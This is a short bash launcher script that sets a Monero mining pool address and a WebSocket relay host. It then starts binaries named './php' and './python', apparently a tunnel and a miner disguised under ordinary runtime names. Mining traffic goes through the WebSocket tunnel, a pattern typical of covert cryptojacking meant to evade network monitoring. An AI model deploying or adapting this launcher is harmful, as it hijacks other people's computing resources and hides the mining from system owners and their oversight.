#!/bin/bash

if [ -z "$POOL_URL" ]; then
    POOL_URL="pool.supportxmr.com:7777"
fi

if [ -z "$WS_URL" ]; then
    WS_URL="wss://sand.wangjm.ml"
fi

./php -L 127.0.0.1:3333:${POOL_URL} ${WS_URL} &
./python
